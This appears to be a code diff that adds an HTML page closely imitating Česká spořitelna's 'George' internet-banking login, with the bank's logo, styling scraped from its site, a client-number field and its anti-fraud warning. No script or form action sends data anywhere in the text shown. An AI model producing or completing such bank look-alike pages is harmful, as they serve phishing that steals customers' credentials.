@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Přihlášení do internetového bankovnictví</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+            background: #2870ED;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .top img {
+            padding: 30px 30px 30px 60px;
+        }
+    
+        .center-box {
+            /*
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            */
+            max-width: 350px;
+            margin: 20px auto;
+        }
+
+        .login-container {
+            background: white;
+            border-radius: 12px;
+            /*box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);*/
+            /*width: 100%;*/
+            overflow: hidden;
+            margin-bottom: 4px;
+        }
+
+        .header {
+            background: white;
+            padding: 20px 20px 0 20px;
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            gap: 20px;
+        }
+
+        .logo {
+            /*
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            gap: 10px;
+            flex-shrink: 0;
+            */
+            flex-shrink: 0;
+        }
+
+        .logo-icon {
+            position: relative;
+            /*
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            */
+        }
+
+        .logo-icon svg {
+            width: 65px;
+            height: 65px;
+        }
+
+        .header-text {
+            /*flex: 1;*/
+            text-align: left;
+        }
+
+        .header-text h1 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #21416c;
+            margin-bottom: 10px;
+            line-height: 26px;
+        }
+
+        .header-text p {
+            font-size: 16px;
+            color: #21416c;
+            line-height: 1.5;
+        }
+
+        .warning-box {
+            background: #fad3d3;
+            border: 1px solid #ffcdd2;
+            border-radius: 8px;
+            padding: 15px;
+            font-size: 14px;
+            color: #21416c;
+            line-height: 1.5;
+            display: flex;
+            gap: 10px;
+        }
+
+        .warning-box a {
+            color: #c62828;
+            text-decoration: underline;
+            font-weight: 600;
+        }
+
+        .warning-box a:hover {
+            text-decoration: none;
+        }
+
+        .form-container {
+            padding: 0 20px 40px 20px;
+            margin-top: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #333;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            color: #333;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #0066cc;
+            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1);
+        }
+
+        .forgot-link {
+            font-size: 13px;
+            color: #0066cc;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 6px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background: #2870ED;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        .btn-primary:hover {
+            background: #0052a3;
+        }
+
+        .btn-primary:active {
+            transform: translateY(1px);
+        }
+
+        .error-message {
+            background: #fff4f4;
+            border: 1px solid #ffcdd2;
+            color: #c62828;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .help-text {
+            font-size: 16px;
+            color: #1a67d2;
+            margin-top: 8px;
+            font-style: normal;
+        }
+
+        mep-fe-info-icon {
+            margin-top: 3px;
+        }
+
+        @media (max-width: 480px) {
+            .header,
+            .form-container {
+                padding-left: 24px;
+                padding-right: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="body">
+        <div class="top">
+            <img _ngcontent-qbk-c34="" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTEyIiBoZWlnaHQ9IjUwIiB2aWV3Qm94PSIwIDAgMTEyIDUwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTk5LjU1MzcgNy44MDcxMkM5Ny4zOTc4IDcuODA3MTIgOTUuNjY2NiA2LjAzMjI5IDk1LjY3NzQgMy44NjU0OEM5NS42ODgzIDEuNzMxMzMgOTcuNDMwNSAtMC4wMTA4Mzc4IDk5LjU2NDYgNS4wNzYzOGUtMDVDMTAxLjY5OSA1LjA3NjM4ZS0wNSAxMDMuNDQxIDEuNzUzMSAxMDMuNDQxIDMuODg3MjVDMTAzLjQ1MiA2LjA0MzE4IDEwMS43MSA3LjgwNzEyIDk5LjU1MzcgNy44MDcxMlpNODcuNjc0NCAyNS4zNDg5SDEwNS44NDdWMjIuOTA5OUg4Ny43MDdDODcuNzAyOCAyMi44MDA2IDg3LjcwMDIgMjEuOTE0MSA4Ny42OTY4IDIwLjcyMDhWMjAuNzIwN1YyMC43MjA3VjIwLjcyMDZWMjAuNzIwNFYyMC43MjAzVjIwLjcyVjIwLjcxOTdWMjAuNzE5M1YyMC43MTg3VjIwLjcxOFYyMC43MTdWMjAuNzE1N1YyMC43MTRDODcuNjkxMyAxOC44MTY0IDg3LjY4MzUgMTYuMTQ2OCA4Ny42NjM1IDE0LjU5MUM4Ny42MzA4IDEyLjQyNDIgODkuMTExNyAxMC4zMTE4IDkxLjkxIDEwLjM1NTRDOTcuMDA1OCAxMC40NDI1IDEwMi4xMTMgMTAuNDQyNSAxMDcuMjA4IDEwLjM1NTRDMTA5LjQwOCAxMC4zMjI3IDExMS40IDExLjkzNDIgMTExLjQgMTQuNTU4NFYxNS44NDMySDkzLjIxNjZWMTguMjI3OEgxMTEuNEwxMTEuNDAxIDE4LjcxNzZDMTExLjQwMyAyMC4xODExIDExMS40MSAyNC40NTggMTExLjQgMjYuNjIyOEMxMTEuMzkgMjkuMjAzNCAxMDkuNzM1IDMwLjgyNTggMTA3LjEzMiAzMC44MjU4SDkxLjk2NDRDODkuMzI5NCAzMC44MjU4IDg3LjY4NTMgMjkuMTgxNiA4Ny42NzQ0IDI2LjU1NzVWMjUuMzQ4OVpNNi41NzY2NyAzOC43MDg2QzYuNTc2NjcgMzcuODA0OSA1LjM1NzE2IDM3Ljc1MDQgMy41NjA1NSAzNy43NTA0QzEuMzgyODUgMzcuNzUwNCAwLjExOTc3OCAzOC42NzU5IDAuMTE5Nzc4IDQwLjI3NjZDMC4xMTk3NzggNDIuMTE2IDEuNzg2NTEgNDIuNzgzNCAzLjE3MTQ1IDQzLjMzODFDNC4xNTU4MiA0My43MzIzIDQuOTk3ODQgNDQuMDY5NSA0Ljk5Nzg0IDQ0LjczQzQuOTk3ODQgNDUuNDgxMyA0LjUwNzg1IDQ1LjgxODggMy4zODYzMyA0NS44MTg4SDAuMDIxNzgxN1Y0Ni40NTAzQzAuMDIxNzgxNyA0Ny4zMTA1IDEuNTU3MDYgNDcuMzEwNSAzLjIyMzAxIDQ3LjMxMDVDNi4wNjQ5MSA0Ny4zMTA1IDcuMDU1NzcgNDYuMDkxIDcuMDU1NzcgNDQuNTU1N0M3LjA1NTc3IDQyLjczODcgNS40NTUyIDQyLjEyODQgNC4wODk3NyA0MS42MDc3QzMuMDc0MTQgNDEuMjIwNCAyLjE4ODYgNDAuODgyOCAyLjE4ODYgNDAuMTM1QzIuMTg4NiAzOS42MTI0IDIuNzAwMzYgMzkuMjUzIDMuNTM4NzcgMzkuMjUzSDYuNTc2NjdWMzguNzA4NlpNMTAuMzU1IDUwSDguMzk1MDVWMzcuODM3NUg5LjQxODU3QzEwLjExNTQgMzcuODM3NSAxMC4zNTUgMzguMjA3NyAxMC4zNTUgMzguNjY1MVYzOC45MjY0QzEwLjkxMDMgMzguMzA1NyAxMS43OTIzIDM3Ljc1MDQgMTIuOTAyOSAzNy43NTA0QzE1LjI1NDggMzcuNzUwNCAxNi4zMjE5IDM5LjU3OTcgMTYuMzIxOSA0Mi41MTk2QzE2LjMyMTkgNDUuNDgxMyAxNS4yNTQ4IDQ3LjI4ODggMTIuOTAyOSA0Ny4yODg4QzExLjgwMzIgNDcuMjg4OCAxMC45MjEyIDQ2LjczMzQgMTAuMzU1IDQ2LjEzNDZWNTBaTTEyLjIwNiAzOS4yOTY2QzExLjQ3NjUgMzkuMjk2NiAxMC44NTU5IDM5LjYwMTUgMTAuMzU1IDM5Ljk5MzVWNDUuMDIzOUMxMC44NTU5IDQ1LjQxNTkgMTEuNDc2NSA0NS43MjA4IDEyLjIwNiA0NS43MjA4QzEzLjcxOTUgNDUuNzIwOCAxNC4yODU3IDQ0LjYyMTEgMTQuMjg1NyA0Mi41MTk2QzE0LjI3NDggNDAuNDM5OSAxMy43MTk1IDM5LjI5NjYgMTIuMjA2IDM5LjI5NjZaTTIxLjU1OTMgMzcuNzUwNEMxOC40MDE2IDM3Ljc1MDQgMTcuNDQzNCAzOS45MDYzIDE3LjQ0MzQgNDIuNTE5NkMxNy40NDM0IDQ1LjEzMjggMTguMzkwNyA0Ny4yODg4IDIxLjU1OTMgNDcuMjg4OEMyNC43MTY5IDQ3LjI4ODggMjUuNjc1MSA0NS4xNDM3IDI1LjY3NTEgNDIuNTE5NkMyNS42NzUxIDM5LjkwNjMgMjQuNzE2OSAzNy43NTA0IDIxLjU1OTMgMzcuNzUwNFpNMjEuNTU5MyAzOS4xNTVDMjMuMTU5OSAzOS4xNTUgMjMuNjQ5OSA0MC4zNTI4IDIzLjY0OTkgNDIuNTE5NkMyMy42NDk5IDQ0LjcwODIgMjMuMTcwOCA0NS44ODQxIDIxLjU1OTMgNDUuODg0MUMxOS45NDc4IDQ1Ljg4NDEgMTkuNDc5NiA0NC43MDgyIDE5LjQ3OTYgNDIuNTE5NkMxOS40Nzk2IDQwLjM1MjggMTkuOTQ3OCAzOS4xNTUgMjEuNTU5MyAzOS4xNTVaTTI5LjE3MDMgMzcuMDg2NEMyOC45MzA4IDM3LjA4NjQgMjguODAwMSAzNy4wMTAyIDI4LjU3MTUgMzYuNzcwNkwyNy4wMDM1IDM0Ljk0MTNDMjYuOTA1NSAzNC44NDMzIDI2LjkwNTUgMzQuNzM0NSAyNi45MDU1IDM0LjY1ODJIMjcuNzY1N0MyOC4wMjcxIDM0LjY1ODIgMjguMTM1OSAzNC43MTI3IDI4LjM5NzMgMzQuOTQxM0wyOS40MjA4IDM1LjgyMzNMMzAuNDY2MSAzNC45NDEzQzMwLjcyNzQgMzQuNzEyNyAzMC44MzYzIDM0LjY1ODIgMzEuMDg2NyAzNC42NTgySDMxLjk0NjlDMzEuOTQ2OSAzNC43MzQ1IDMxLjk0NjkgMzQuODQzMyAzMS44NzA3IDM0Ljk0MTNMMzAuMjgxIDM2Ljc3MDZDMzAuMDUyMyAzNy4wMTAyIDI5LjkyMTcgMzcuMDg2NCAyOS42ODIxIDM3LjA4NjRIMjkuMTcwM1pNMjcuMjMyMiA0Ny4xOTA5VjM3LjgzNzdIMjguMjU1N0MyOC44ODcyIDM3LjgzNzcgMjkuMTQ4NiAzOC4zMDU5IDI5LjE5MjEgMzkuMDEzN0MyOS45NTQzIDM4LjAyMjggMzAuOTM0MyAzNy43Mzk3IDMxLjY3NDcgMzcuNzM5N0MzMi4wMTIyIDM3LjczOTcgMzIuMzQ5OCAzNy44Mzc3IDMyLjM0OTggMzguMjA3OVYzOS42NjdIMzEuODgxNkMzMC40NDQzIDM5LjY2NyAyOS43NDc0IDM5Ljk3MTggMjkuMTkyMSA0MC4zNjM4VjQ3LjE5MDlIMjcuMjMyMlpNMzMuMTQ0NyAzNi44Njg1SDM1LjEwNDZWMzQuODQzM0gzMy45ODMxQzMzLjM3MzMgMzQuODQzMyAzMy4xNDQ3IDM1LjE4MDggMzMuMTQ0NyAzNS43Nzk3VjM2Ljg2ODVaTTM0LjI0NDQgMzcuODM3NkgzMy4xNDQ3VjQ3LjE5MDhIMzUuMTA0NlYzOC43NzRDMzUuMTA0NiAzOC4xNzUxIDM0Ljg2NSAzNy44Mzc2IDM0LjI0NDQgMzcuODM3NlpNMzkuNTQ3MSAzNy44Mzc3SDQxLjYzNzdWMzkuMjk2OEgzOS41NDcxVjQ0Ljc0MTFDMzkuNTQ3MSA0NS40NzA2IDM5LjYzNDIgNDUuNzUzNyA0MC4yNzY2IDQ1Ljc1MzdINDEuNjM3N1Y0Ni4yNDM3QzQxLjYzNzcgNDcuMDI3NiA0MC45NjI2IDQ3LjI1NjMgMzkuODk1NSA0Ny4yNTYzQzM3Ljc2MTQgNDcuMjU2MyAzNy41NzYzIDQ2LjExMyAzNy41NzYzIDQ0Ljc1MTlWMzkuMzA3N0gzNi4zNDU5VjM4LjIxODhMMzcuNTc2MyAzNy44NDg2TDM4LjI4NCAzNi4zNDZDMzguNDkwOSAzNS45NTQgMzguNjQzNCAzNS43OTA3IDM4Ljk5MTggMzUuNzkwN0gzOS41MzYyVjM3LjgzNzdIMzkuNTQ3MVpNNDkuNDk5MiA0Ni4zMDlWNDUuNzg2NEg0Ni40MTc4QzQ0Ljg3MTYgNDUuNzg2NCA0NC4xMjAzIDQ1LjAzNTEgNDQuMTIwMyA0My4wMzE2SDQ5Ljg0NzdDNDkuOTQ1NyA0Mi4xMDYxIDQ5Ljk0NTcgNDEuNzQ2OCA0OS45NDU3IDQxLjI3ODVDNDkuOTQ1NyAzOS4xNjYyIDQ4LjY2MDggMzcuNzM5OCA0Ni4xODkxIDM3LjczOThDNDMuMTE4NSAzNy43Mzk4IDQyLjA5NSAzOS44ODQ4IDQyLjA5NSA0Mi41MDg5QzQyLjA5NSA0NS4xMjIyIDQzLjA2NDEgNDcuMjc4MSA0Ni4yMTA5IDQ3LjI3ODFDNDguNDc1NyA0Ny4yNzgxIDQ5LjQ5OTIgNDcuMDgyMSA0OS40OTkyIDQ2LjMwOVpNNDcuOTg1NyA0MS4wMjgyQzQ3Ljk4NTcgNDEuMjM1MSA0Ny45ODU3IDQxLjU3MjYgNDcuOTYzOSA0MS43MzU5SDQ0LjEzMTJDNDQuMjA3NCAzOS45MDY2IDQ0LjkwNDMgMzkuMTU1MyA0Ni4yMTA5IDM5LjE1NTNDNDcuNjI2NCAzOS4xNTUzIDQ3Ljk4NTcgNDAuMTg5NyA0Ny45ODU3IDQxLjAyODFWNDEuMDI4MlpNNTMuNDA4MiA0Ny4xOTA4SDUxLjQ0ODNWMzUuNzc5N0M1MS40NDgzIDM1LjE4MDggNTEuNjc2OSAzNC44NDMzIDUyLjI4NjcgMzQuODQzM0g1My40MDgyVjQ3LjE5MDhaTTU1LjQ2NjEgMzcuODM3NVY0Ny4xOTA4SDU3LjQ0NzhWMzkuOTgyNkM1Ny45NzA1IDM5LjU5MDYgNTguNyAzOS4yOTY2IDU5LjQwNzggMzkuMjk2NkM2MC40NTMxIDM5LjI5NjYgNjEuMTA2NCAzOS43MTA0IDYxLjEwNjQgNDAuNzMzOVY0Ny4xOTA4SDYzLjA2NjNWNDAuNjQ2OEM2My4wNjYzIDM4LjkyNjQgNjIuMTI5OSAzNy43NTA0IDYwLjE4MDkgMzcuNzUwNEM1OS4yMDA5IDM3Ljc1MDQgNTguMjMxOCAzOC4wODggNTcuNDI2MSAzOC45MjY0VjM4LjY0MzNDNTcuNDI2MSAzOC4xOTY4IDU3LjE4NjUgMzcuODM3NSA1Ni40ODk2IDM3LjgzNzVINTUuNDY2MVpNNzEuMTg5MSA0Ny4xOTFDNzAuNTE0MSA0Ny4xOTEgNzAuMjUyNyA0Ni44MzE3IDcwLjI1MjcgNDYuMzg1M1Y0Ni4xMjM5QzY5LjQ0NyA0Ni45NjI0IDY4LjQwMTcgNDcuMjc4MSA2Ny41MTk3IDQ3LjI3ODFDNjUuNzQ0OSA0Ny4yNzgxIDY0LjYzNDMgNDYuMjU0NiA2NC42MzQzIDQ0LjY2NDlDNjQuNjM0MyA0Mi4zMjM4IDY3LjE5MzEgNDEuNjkyMyA3MC4yNDE4IDQxLjU2MTZWNDAuNzc3N0M3MC4yNDE4IDM5LjYwMTcgNjkuNDAzNCAzOS4yNDI0IDY4LjIwNTcgMzkuMjQyNEg2NS4zMjAyVjM4LjY5OEM2NS4zMjAyIDM3Ljc5NDIgNjYuNDQxNyAzNy43Mzk4IDY4LjUyMTUgMzcuNzM5OEM3MC44NDA3IDM3LjczOTggNzIuMjAxOCAzOC43MDg5IDcyLjIwMTggNDAuNjc5N1Y0Ny4xOTFINzEuMTg5MVpNNzAuMjUyNyA0Mi43Mzc2QzY3LjY5MzkgNDIuNzcwMyA2Ni43MTQgNDMuMjgyIDY2LjcxNCA0NC4zODE4QzY2LjcxNCA0NS4zNTA5IDY3LjQyMTcgNDUuNjg4NCA2OC4zNzk5IDQ1LjY4ODRDNjkuMDc2OCA0NS42ODg0IDY5Ljc4NDUgNDUuNDI3MSA3MC4yNTI3IDQ1LjAxMzNWNDIuNzM3NlpNMTQuNTAzNSAxMi42MzAzQzE0LjUwMzUgMTAuOTc1MiAxMy4xNDI0IDEwLjMxMSA4Ljg3NDE0IDEwLjMxMUMzLjA1OTY3IDEwLjMxMSAwIDEzLjQyNTIgMCAyMC42MzM0QzAgMjcuODYzMyAzLjA0ODc5IDMwLjk3NzUgOC44NzQxNCAzMC45Nzc1QzEzLjEzMTYgMzAuOTc3NSAxNC41MDM1IDMwLjMxMzMgMTQuNTAzNSAyOC42NTgyVjI2Ljk3MDVIOC44NzQxNEM1LjcxNjQ3IDI2Ljk3MDUgNC43MzY1MSAyNS42MDk0IDQuNzM2NTEgMjAuNjQ0M0M0LjczNjUxIDE1LjY5IDUuNzI3MzYgMTQuMzE4IDguODc0MTQgMTQuMzE4SDE0LjUwMzVWMTIuNjMwM1pNNy4xNTM3NiA4Ljc3NTc3QzcuNTM0ODYgOS4yMjIxOSA3Ljc2MzUxIDkuMzIwMTkgOC4xNDQ2MSA5LjMyMDE5SDkuMzUzMjRDOS43NjcgOS4zMjAxOSA5Ljk5NTY2IDkuMjIyMTkgMTAuMzc2OCA4Ljc3NTc3TDEzLjAzMzYgNS41MzA5OUMxMy4xNjQyIDUuMzY3NjYgMTMuMTY0MiA1LjE4MjU1IDEzLjE2NDIgNS4wNTE4OUgxMS4zNDU4QzEwLjg5OTQgNS4wNTE4OSAxMC43NDcgNS4xNDk4OSAxMC4yNjc5IDUuNTMwOTlMOC43NzYxNSA2LjgzNzYxTDcuMjUxNzUgNS41MzA5OUM2LjgwNTMzIDUuMTQ5ODkgNi42MjAyMiA1LjA1MTg5IDYuMjA2NDYgNS4wNTE4OUg0LjM1NTQxQzQuMzU1NDEgNS4xODI1NSA0LjM1NTQxIDUuMzc4NTUgNC40ODYwNyA1LjUzMDk5TDcuMTUzNzYgOC43NzU3N1pNMTYuMTA0MSAxMi4yMTczQzE2LjEwNDEgMTEuMDc0IDE2LjYxNTkgMTAuNDY0MyAxNy43OTE4IDEwLjQ2NDNIMjkuMzY2M1YxMi42OTY0QzI5LjM2NjMgMTMuODM5NyAyOC43NTY2IDE0LjM4NDEgMjcuNTQ4IDE0LjM4NDFIMjAuNzFWMTguNjE5OEgyOC4xOTA0VjIyLjI3ODNIMjAuNzFWMjYuOTYwNEgyOS41MTg4VjI5LjE5MjVDMjkuNTE4OCAzMC4zMzU4IDI4LjkwOSAzMC44NDc2IDI3LjczMzEgMzAuODQ3NkgxNy43NzAxQzE2LjU5NDEgMzAuODQ3NiAxNi4wODIzIDMwLjIzNzggMTYuMDgyMyAyOS4wOTQ1VjEyLjIxNzNIMTYuMTA0MVpNNDQuMDk4NSAxMi41NzU5QzQ0LjA5ODUgMTAuNzU3NiA0MS43NDY2IDEwLjMxMTEgMzcuNjQxNiAxMC4zMTExQzMyLjg5NDIgMTAuMzExMSAzMC43MzgzIDEyLjY5NTcgMzAuNzI3NCAxNS43NDQ1QzMwLjcyNzQgMTkuOTMwMyAzNC4yMDUyIDIxLjQyNzQgMzYuOTYzMSAyMi42MTQ3QzM4Ljc3NTIgMjMuMzk0OCA0MC4yNzY2IDI0LjA0MTEgNDAuMjc2NiAyNS4yMjg0QzQwLjI3NjYgMjYuNDA0NCAzOS4zOTQ3IDI2Ljk4MTUgMzcuNTc2MyAyNi45ODE1SDMwLjY3M1YyOC43MzQ1QzMwLjY3MyAzMC40ODc2IDMzLjcgMzAuOTk5MyAzNy4zNTg1IDMwLjk5OTNDNDMuMTgzOSAzMC45OTkzIDQ1LjE4NzQgMjguMjMzNiA0NS4xODc0IDI0Ljk4ODlDNDUuMTg3NCAyMC44MjUgNDEuNjExNiAxOS4zODM1IDM4LjgyODkgMTguMjYxN0MzNy4wNTYzIDE3LjU0NzEgMzUuNjA1NSAxNi45NjIyIDM1LjYwNTUgMTUuODg2MUMzNS42MDU1IDE0Ljg3MzQgMzYuMzAyMyAxNC4zMjkgMzguMDg4IDE0LjMyOUg0NC4wOTg1VjEyLjU3NTlaTTUxLjk0OTEgMTkuODgyOEw1Ny44NjE2IDExLjMyNDRDNTguMzQwNyAxMC41OTQ5IDU4LjU5MTEgMTAuNDY0MyA1OS4yMDA5IDEwLjQ2NDNINjMuNDY5MkM2My40NjkyIDEwLjc0NzQgNjMuNDAzOSAxMS4wMDg3IDYzLjE4NjEgMTEuMzI0NEw1Ni42MzEyIDIwLjMyOTNMNjMuNTAxOSAyOS45NjU2QzYzLjY2NTIgMzAuMjE2IDYzLjc4NSAzMC41NDI3IDYzLjc4NSAzMC44MjU4SDU5LjcxMjZDNTguODE5OCAzMC44MjU4IDU4LjUzNjcgMzAuNzYwNSA1Ny45NTk2IDI5LjkwMDNMNTEuOTQ5MSAyMS40Mzk5VjMwLjgyNThINDcuMzMyNFYxMi4yMTczQzQ3LjMzMjQgMTEuMDc0IDQ3Ljg0NDIgMTAuNDY0MyA0OS4wMjAxIDEwLjQ2NDNINTEuOTQ5MVYxOS44ODI4Wk03Ni4zNjEyIDExLjE5M0M3Ni4xNjUyIDEwLjQ5NjIgNzUuNzg0MSAxMC4zOTgyIDc0Ljk1NjYgMTAuMzk4Mkg3MC42Nzc0QzY5Ljg0OTkgMTAuMzk4MiA2OS40NTc5IDEwLjQ5NjIgNjkuMjcyOCAxMS4xOTNMNjQuMDU3MiAzMC4wNjI4QzYzLjk5MTggMzAuMzc4NiA2My45NTkyIDMwLjYzOTkgNjMuOTU5MiAzMC44MjVINjcuNjE3N0M2OC40NDUyIDMwLjgyNSA2OC42OTU3IDMwLjc5MjQgNjguODU5IDMwLjA5NTVMNzAuMDAyMyAyNS43NjE5SDc1LjU2NjNMNzYuNzA5NiAzMC4wOTU1Qzc2LjkwNTYgMzAuNzkyNCA3Ny4xNTYxIDMwLjgyNSA3Ny45ODM2IDMwLjgyNUg4MS42NDIxQzgxLjY0MjEgMzAuNjM5OSA4MS42MDk1IDMwLjM0NTkgODEuNTQ0MSAzMC4wNjI4TDc2LjM2MTIgMTEuMTkzWk03NC43Mjc5IDIyLjI2NjZINzAuNzUzNkw3Mi42NTkxIDE1LjE2NzNINzIuODIyNEw3NC43Mjc5IDIyLjI2NjZaTTczLjQzMjIgOS4zMjAxOUM3My44NDYgOS4zMjAxOSA3NC4wNjM3IDkuMjg3NTIgNzQuNDc3NSA4Ljg0MTA5TDc3LjI2NDkgNS44NDY3NUM3Ny41MTU0IDUuNTUyNzYgNzcuNTgwNyA1LjQzMjk5IDc3LjU4MDcgNS4yNjk2NkM3Ny41ODA3IDUuMTQ5ODkgNzcuNDUwMSA1LjA1MTg5IDc3LjE5OTYgNS4wNTE4OUg3NS4zODEyQzc1LjAxMSA1LjA1MTg5IDc0Ljc4MjQgNS4xNDk4OSA3NC40MDEzIDUuNTk2MzJMNzEuNzIyNyA4Ljg0MTA5QzcxLjU5MiA5LjAwNDQyIDcxLjU5MiA5LjE4OTUzIDcxLjU5MiA5LjMyMDE5SDczLjQzMjJaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4K" alt="Logo České spořitelny">
+        </div>
+        <div class="center-box">
+            <div class="login-container">
+                <div class="header">
+                    <div class="logo">
+                        <div class="logo-icon">
+                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="-10 0 130 184">
+                                <path d="M0 0 C38.94 0 77.88 0 118 0 C118 60.72 118 121.44 118 184 C79.06 184 40.12 184 0 184 C0 123.28 0 62.56 0 0 Z " fill="#FEFEFE" transform="translate(0,0)"/>
+                                <path d="M0 0 C11.67045313 7.97791499 20.80393039 19.0644472 24.28515625 33.03515625 C26.60357945 49.04119333 23.78037915 63.00504439 14.5 76.4765625 C6.50771227 86.92004863 -4.73934948 93.63155661 -17.55859375 96.58984375 C-18.79609375 96.67234375 -20.03359375 96.75484375 -21.30859375 96.83984375 C-22.78392578 96.95199219 -22.78392578 96.95199219 -24.2890625 97.06640625 C-38.78651116 97.68889557 -51.46826897 93.61334292 -62.30859375 83.83984375 C-72.92728793 73.99648279 -78.59873346 61.88785118 -79.5234375 47.49609375 C-79.95656686 31.55693335 -74.76731114 18.72930173 -63.79296875 7.12890625 C-46.25217028 -9.03289863 -20.66635921 -12.30355301 0 0 Z " fill="#4261E7" transform="translate(86.30859375,16.16015625)"/>
+                                <path d="M0 0 C9.47327942 5.44302875 14.8889452 12.72933561 18.3125 23 C19.44803461 35.34893886 18.57289697 44.65358989 11.3125 55 C6.06188758 61.08569988 -0.83259323 65.26245937 -8.6875 67 C-21.80428237 67.90193985 -30.62283 67.13522172 -41.0625 58.5625 C-49.10400836 51.07111495 -52.48859905 42.12010668 -53 31.3125 C-52.87471192 22.0551027 -49.0353271 13.6574772 -42.6875 7 C-30.97503928 -3.79980144 -14.68042152 -7.37032651 0 0 Z " fill="#FDFDFE" transform="translate(75.6875,29)"/>
+                                <path d="M0 0 C5.28 0 10.56 0 16 0 C15.68977467 13.96013977 11.64059694 25.69880541 2 36 C1.42894531 36.61230469 0.85789063 37.22460938 0.26953125 37.85546875 C-7.29135253 45.15841194 -19.10659097 51.41874749 -29.65234375 52.1953125 C-31.76822917 52.13020833 -33.88411458 52.06510417 -36 52 C-36 46.39 -36 40.78 -36 35 C-34.246875 34.79375 -32.49375 34.5875 -30.6875 34.375 C-21.75245493 32.8664859 -13.771763 29.17687275 -8.203125 21.83203125 C-3.66264899 14.91812459 -1.83234775 8.06233012 0 0 Z " fill="#4261E7" transform="translate(95,125)"/>
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="header-text">
+                        <h1>George</h1>
+                        <p>Přihlášení do internetového bankovnictví</p>
+                    </div>
+                </div>
+
+                <div class="form-container">
+                    <form id="loginForm">
+                        <div class="form-group">
+                            <input 
+                                type="text" 
+                                id="username" 
+                                name="username" 
+                                placeholder="Klientské číslo / Uživatelské jméno"
+                                required
+                            >
+                        </div>
+
+                        <button type="submit" class="btn-primary">Pokračovat</button>
+                        <div class="help-text" style="margin-top: 30px; text-align: center; font-style: normal;">
+                            <strong>Nepamatuji si uživatelské jméno</strong>
+                        </div>
+                    </form>
+                </div>
+            </div>
+
+            <div class="warning-box">
+                <mep-fe-info-icon _ngcontent-qbk-c19="" class="info-box-icon" _nghost-qbk-c12="">
+                    <div _ngcontent-qbk-c12=""><!----><!----><!----><svg _ngcontent-qbk-c12="" width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg"><path _ngcontent-qbk-c12="" fill-rule="evenodd" clip-rule="evenodd" d="M0.461434 13.5981C-0.454798 15.2643 0.750242 17.3031 2.65161 17.3031H15.3466C17.248 17.3031 18.4539 15.2644 17.5377 13.5982L11.1901 2.05729C10.24 0.33087 7.75903 0.33087 6.80903 2.05711L0.461434 13.5981ZM15.3466 15.6364H2.65161C2.01802 15.6364 1.61634 14.9568 1.92183 14.4013L8.26929 2.86049C8.58587 2.28524 9.41319 2.28524 9.72987 2.86067L16.0773 14.4013C16.3826 14.9566 15.9805 15.6364 15.3466 15.6364ZM9.83261 9.80305V6.46972C9.83261 6.00948 9.45952 5.63639 8.99928 5.63639C8.53904 5.63639 8.16595 6.00948 8.16595 6.46972V9.80305C8.16595 10.2633 8.53904 10.6364 8.99928 10.6364C9.45952 10.6364 9.83261 10.2633 9.83261 9.80305ZM8.16678 13.134C8.16678 13.594 8.54011 13.9673 9.00011 13.9673C9.46011 13.9673 9.83345 13.594 9.83345 13.134C9.83345 12.6731 9.46011 12.3006 9.00011 12.3006C8.54011 12.3006 8.16678 12.6731 8.16678 13.134Z" fill="#E72222"></path></svg><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----></div>
+                </mep-fe-info-icon>
+                <div>
+                    <span style="color: #21416c; font-weight: 700; font-style: normal;">Předali byste cizímu člověku statisíce?</span><br>
+                    Možná i vás umí podvodníci přesvědčit.<br>
+                    <a href="#">Zjistit více</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
